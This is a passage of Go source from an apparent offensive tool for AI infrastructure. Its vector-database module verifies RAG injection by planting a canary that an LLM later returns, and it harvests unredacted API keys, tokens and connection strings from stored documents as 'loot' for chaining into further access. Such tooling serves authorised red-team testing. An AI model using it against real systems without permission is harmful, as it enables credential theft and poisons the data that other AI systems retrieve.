		infof("Injection succeeded but canary not found in LLM response")
	} else if result.Injected {
		infof("Injection succeeded but LLM query failed")
	}

	if err != nil {
		warnf("RAG verification completed with error: %v", err)
	}

	// A completed injection whose LLM leg failed is a partial failure, not a clean run.
	partialFailures := 0
	if result.Injected && !result.LLMQueried {
		partialFailures = 1
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "vectordb",
		Action:              "rag-verify",
		ResourcesEnumerated: 1,
		PartialFailures:     partialFailures,
		Mutating:            true,
	})
}

func newVDBClient() (vectordb.ProviderClient, http.Header, error) {
	if strings.TrimSpace(vdbTarget) == "" {
		return nil, nil, missingFlagError("target", formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb enum"))
	}
	if !isSupportedVDBType(vdbType) {
		return nil, nil, invalidChoiceError("type", vdbType, []string{"chromadb", "milvus", "pgvector", "qdrant", "weaviate"})
	}

	// pgvector uses PostgreSQL wire protocol, not HTTP.
	if strings.ToLower(strings.TrimSpace(vdbType)) == "pgvector" {
		return newPgvectorClient()
	}

	headers, err := exploitcommon.ParseHeaderFlags(vdbHeaders)
	if err != nil {
		return nil, nil, err
	}
	if strings.TrimSpace(vdbAPIKey) == "" {
		vdbAPIKey = strings.TrimSpace(os.Getenv("AIPOSTEX_VDB_API_KEY"))
	} else {
		warnf("using --api-key may expose secrets via shell history or process list; prefer AIPOSTEX_VDB_API_KEY")
	}
	target := normalizeAndWarnTarget(vdbTarget)
	vdbTarget = target
	headers = exploitcommon.ApplyAPIKey(headers, vdbType, vdbAPIKey)
	client, err := vectordb.NewProviderClient(currentContext(), vdbType, target, cfg.Timeout, headers)
	if err != nil {
		return nil, nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, nil, err
	}
	if configurable, ok := client.(vectordb.RuntimeConfigurable); ok {
		configurable.SetHTTPClient(httpClient)
	}
	return client, headers, nil
}

func newPgvectorClient() (vectordb.ProviderClient, http.Header, error) {
	// Parse host:port from --target. For pgvector, target is host:port or just host.
	host := strings.TrimSpace(vdbTarget)
	port := 5432

	// Strip any protocol prefix if user accidentally included one.
	host = strings.TrimPrefix(host, "http://")
	host = strings.TrimPrefix(host, "https://")
	host = strings.TrimRight(host, "/")

	// Split host:port.
	if idx := strings.LastIndex(host, ":"); idx > 0 {
		portStr := host[idx+1:]
		host = host[:idx]
		p := 0
		if _, err := fmt.Sscanf(portStr, "%d", &p); err == nil && p > 0 {
			port = p
		}
	}

	password := vdbDBPass
	if password == "" {
		password = strings.TrimSpace(os.Getenv("AIPOSTEX_VDB_PASSWORD"))
	}

	client, err := vectordb.NewPgvectorClient(currentContext(), vectordb.PgvectorConfig{
		Host:     host,
		Port:     port,
		User:     vdbDBUser,
		Password: password,
		Database: vdbDBName,
		SSLMode:  vdbDBSSL,
	}, cfg.Timeout)
	if err != nil {
		return nil, nil, err
	}
	return client, nil, nil
}

func renderCount(count int) string {
	if count < 0 {
		return "unknown"
	}
	return fmt.Sprintf("%d", count)
}

func headerNames(headers http.Header) []string {
	names := make([]string, 0, len(headers))
	for name := range headers {
		names = append(names, name)
	}
	return names
}

func resolveVDBLimit(cmd *cobra.Command) error {
	if cmd.Flags().Changed("max-docs") {
		vdbLimit = vdbMaxDocs
	}
	if vdbLimit < 0 {
		return fmt.Errorf("--limit must be zero or greater")
	}
	return nil
}

func isSupportedVDBType(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "chromadb", "weaviate", "qdrant", "milvus", "pgvector":
		return true
	default:
		return false
	}
}

// isLikelyPublicCollection returns true for collection names that suggest
// publicly intended content where generic pattern matches are likely noise.
func isLikelyPublicCollection(name string) bool {
	lower := strings.ToLower(name)
	publicMarkers := []string{"public", "faq", "docs", "documentation", "help", "knowledge", "readme"}
	for _, marker := range publicMarkers {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

// isLowConfidencePattern identifies generic patterns that produce frequent
// false positives in documentation/public content.
func isLowConfidencePattern(patternName string) bool {
	switch patternName {
	case "API Key (Generic)", "Password Field", "Bearer Token",
		"Generic Secret Assignment", "Internal IP", "Email Address",
		"Classification Marker":
		return true
	}
	return false
}

// classifyVDBCredentialMatch maps a sensitive-pattern hit to a structured
// credential (credType + concrete value) when the match is credential-shaped,
// so search-sensitive can emit it into the extracted_credentials loot channel.
// It returns ("", "") for pure PII and for anything that has no aipostex-chainable
// credential type, leaving those as findings only. The returned credType strings
// are exactly the ones the chaining layer understands (see
// credchain.actionsForCredential): openai-api-key, anthropic-api-key, hf-token,
// bearer-token, api-key, db-connection-string. The concrete value is pulled from
// the pattern's own regex over the match context (never the ±120-char window, and
// never redacted).
func classifyVDBCredentialMatch(patternName, context string) (credType, value string) {
	value = extractVDBPatternValue(patternName, context)
	if value == "" {
		return "", ""
	}
	// Value-shape classification mirrors ray.go's classifyRayEnvCredential so
	// vector-store loot types match runtime-env loot types (sk-ant- before sk-).
	switch {
	case strings.HasPrefix(value, "sk-ant-"):
		return "anthropic-api-key", value
	case strings.HasPrefix(value, "sk-"):
		return "openai-api-key", value
	case strings.HasPrefix(value, "hf_"):
		return "hf-token", value
	}
	switch patternName {
	case "OpenAI API Key":
		return "openai-api-key", value
	case "Anthropic API Key":
		return "anthropic-api-key", value
	case "HuggingFace Token":
		return "hf-token", value
	case "Bearer Token":
		// A "Bearer Token" pattern can match the literal label ("Bearer Token") or a
		// bare word after "bearer "; require real token material so a label never
		// becomes a credential.
		if !looksLikeBearerTokenValue(value) {
			return "", ""
		}
		return "bearer-token", value
	case "Connection String":
		return "db-connection-string", value
	case "API Key (Generic)", "Generic Secret Assignment":
		return "api-key", value
	default:
		// Credential-shaped patterns with no aipostex-chainable type (AWS/GitHub/
		// Vault/Slack/… service keys) and all pure-PII patterns fall through here.
		return "", ""
	}
}

// extractVDBPatternValue returns the concrete secret substring for a named
// sensitive pattern from the match context, re-using the package's own compiled
// regexes so the value stays in sync with what SearchSensitiveDocuments matched.
// For patterns with a capture group holding the secret (key=VALUE forms), it
// returns the last non-empty capture; otherwise the full match. It strips a
// leading "bearer " so bearer-token loot carries only the token.
func extractVDBPatternValue(patternName, context string) string {
	for _, p := range vectordb.DefaultSensitivePatterns() {
		if p.Name != patternName {
			continue
		}
		groups := p.Regex.FindStringSubmatch(context)
		if len(groups) == 0 {
			return ""
		}
		value := groups[0]
		// Prefer the last non-empty capture group (the value in key=VALUE forms).
		for i := len(groups) - 1; i >= 1; i-- {
			if strings.TrimSpace(groups[i]) != "" {
				value = groups[i]
				break
			}
		}
		value = strings.Trim(strings.TrimSpace(value), `'"`)
		if strings.HasPrefix(strings.ToLower(value), "bearer ") {
			value = strings.TrimSpace(value[len("bearer "):])
		}
		return value
	}
	return ""
}

// looksLikeBearerTokenValue rejects "Bearer Token"-pattern hits that are really the
// label itself or a bare word rather than a token: it requires ≥16 chars of token
// charset and rejects metadata field-names. Kills `Bearer Token = Token`.
func looksLikeBearerTokenValue(s string) bool {
	s = strings.TrimSpace(s)
	if len(s) < 16 || credchain.LooksLikeMetadataKey(s) {
		return false
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '.', r == '_', r == '-':
		default:
			return false
		}
	}
	return true
}
